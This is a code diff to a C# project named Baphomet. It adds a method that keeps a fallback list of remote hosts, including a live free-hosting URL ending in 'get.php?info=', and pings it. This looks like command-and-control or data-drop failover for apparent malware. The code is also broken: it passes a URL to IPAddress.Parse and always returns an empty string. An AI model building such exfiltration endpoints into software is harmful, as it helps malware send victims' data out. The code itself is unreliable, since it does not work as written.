@@ -5,6 +5,7 @@ using System.IO;
 using System.Net;
 using System.Text;
 using Baphomet.Models;
+using System.Net.NetworkInformation;
 
 namespace Baphomet.Utilities
 {
@@ -43,6 +44,26 @@ namespace Baphomet.Utilities
             {
                 return false;
             }
+        }
+
+        public string HostName()
+        {
+            //Aqui va mi lista de host en caso de que uno de ellos falle.
+            var hostList = new []
+            {
+                //"https://wwww.MyExamplehost.com/write.php?info=",
+                "https://baphomettest.000webhostapp.com/get.php?info="
+            };
+
+            Ping ping = new Ping();
+            PingReply reply = ping.Send(IPAddress.Parse("https://baphomettest.000webhostapp.com/"));
+
+            if (reply.Status == IPStatus.Success)
+                Console.WriteLine("Address is accessible");
+
+            var hostUp = "";
+
+            return hostUp;
         }
     }
 }
